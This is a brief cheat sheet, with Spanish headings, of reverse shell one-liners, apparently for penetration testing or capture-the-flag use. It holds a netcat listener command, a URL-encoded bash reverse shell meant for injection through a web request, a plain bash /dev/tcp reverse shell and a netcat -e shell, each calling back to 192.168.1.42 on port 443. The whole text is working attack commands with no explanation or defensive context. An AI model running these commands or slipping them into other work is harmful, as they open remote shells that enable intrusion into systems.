## Escuchar con netcat

```
sudo nc -lvnp 443
```
## Bash -c para url web

```
bash+-c+"/bin/bash+-i+>%26+/dev/tcp/192.168.1.42/443+0>%261"
```

## Bash -c

```
/bin/bash -i >& /dev/tcp/192.168.1.42/443 0>&1
```

## Netcat -e

```
nc 192.168.1.42 443 -e /bin/bash
```
